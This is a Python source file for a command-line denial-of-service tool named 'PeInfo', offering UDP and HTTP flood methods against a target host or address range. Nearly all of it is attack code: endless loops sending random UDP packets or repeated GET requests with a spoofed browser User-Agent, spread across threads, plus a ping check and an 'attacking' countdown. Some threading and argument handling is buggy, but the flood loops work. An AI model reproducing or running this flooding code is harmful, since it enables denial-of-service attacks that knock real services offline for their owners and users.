import subprocess
import datetime
import sys
import time
import threading
import socket
import random
import threading
import requests
from colorama import Fore
from src.help import Help

# ./pinfo -d -uD -t 10000 -p 80 -s 120 192.168.0.0/16

class DDoS:
    def __init__(self, target: str):
      self.target = target
      self.argument_handlers()

    def argument_handlers(self):
      thread = 10
      port = 80
      second = 5
      now = datetime.datetime.now()
      formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")
      print("Starting PeInfo v1.0 ( https://nextjiesdev.site ) at", formatted_time)
      for i in sys.argv[2:]:
         if i == "-uD":
            if len(sys.argv) > 2:
               if "-t" in sys.argv[3:]:
                  for k in sys.argv[4:5]:
                     thread = k
               if "-p" in sys.argv[3:]:
                  for k in sys.argv[6:7]:
                     port = k
               if "-s" in sys.argv[3:]:
                  for k in sys.argv[8:9]:
                     second = k

               self.target = sys.argv[-1]
               print("PeInfo attacking DDoS with UDP method with target", self.target, "with thread", thread, "and port", port)
               if self.ping_host(self.target):
                  self.countdown_timer(seconds=int(second))
                  # self.start_udp_flood(port=int(port), threads_count=int(thread))
               break
            else:
               Help.exampleUsage()
               break
         elif i == "-tC":
            if len(sys.argv) > 2:
               if "-t" in sys.argv[3:]:
                  for k in sys.argv[4:5]:
                     thread = k
               if "-p" in sys.argv[3:]:
                  for k in sys.argv[6:7]:
                     port = k
               if "-s" in sys.argv[3:]:
                  for k in sys.argv[8:9]:
                     second = k

               self.target = sys.argv[-1]
               print("PeInfo attacking DDoS with TCP method with target", self.target, "with thread", thread, "and port", port)
               if self.ping_host(self.target):
                  # self.countdown_timer(seconds=int(second))
                  self.start_tcp_flood(threads_count=int(thread))
               break
            else:
               Help.exampleUsage()
            break
         elif i is not "-uD" or i is not "-tC":
            Help.exampleUsage()
            break
         else:
            Help.exampleUsage()
            break

    def agents(self):
       f = open("./agent.txt", "r")
       print(f.read())
          
    def udp_method(self, port):
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      payload = random._urandom(1024)  # Data acak dengan ukuran 1024 byte
      while True:
         try:
            sock.sendto(payload, (self.target, port))
            print(f"Packet sent to {self.target}:{port}")
         except Exception as e:
               print(f"Error: {e}")

    def start_udp_flood(self, threads_count, port):
      threads = []
      for i in range(threads_count):
         thread = threading.Thread(target=self.udp_method(port=port))
         threads.append(thread)
         thread.start()

      for thread in threads:
         thread.join()


    
    def tcp_method(self):
       headers = {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
       }

       try:
          while True:
            response = requests.get(self.target, headers=headers)
            print(f"Status Code: {response.status_code}")
       except Exception as e:
          print(f"Error: {e}")


    def start_tcp_flood(self, threads_count):
      threads = []
      for i in range(threads_count):
         thread = threading.Thread(target=self.tcp_method())
         threads.append(thread)
         thread.start()

      for thread in threads:
         thread.join()

    def ping_host(self, host:str):
      try:
         response = subprocess.run(
            ["ping", "-c", "1", host],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
         )
         
         if response.returncode == 0:
            print(f"Host {host} is reachable.")
            return True
         else:
            print(f"Host {host} is not reachable.")
            return False
      except Exception as e:
         print(f"An error occurred: {e}")
         return False
      
    def countdown_timer(self, seconds):
      while seconds:
         mins, secs = divmod(seconds, 60)
         timer = f'{mins:02}:{secs:02}'
         print("Time left attacking for", timer, end='\r')
         time.sleep(1)
         seconds -= 1
      print()
      print(Fore.GREEN, "Attacking complete!")